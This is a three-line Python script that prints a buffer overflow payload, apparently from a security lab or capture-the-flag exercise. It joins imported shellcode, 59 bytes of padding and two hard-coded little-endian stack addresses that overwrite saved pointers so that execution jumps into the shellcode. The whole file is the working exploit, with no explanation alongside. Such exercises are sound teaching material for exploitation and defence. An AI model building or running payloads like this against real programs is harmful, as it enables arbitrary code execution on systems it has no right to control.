from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode+b"a"*59+0xFFF6EA84.to_bytes(4, "little")+0xFFF6F298.to_bytes(4, "little"))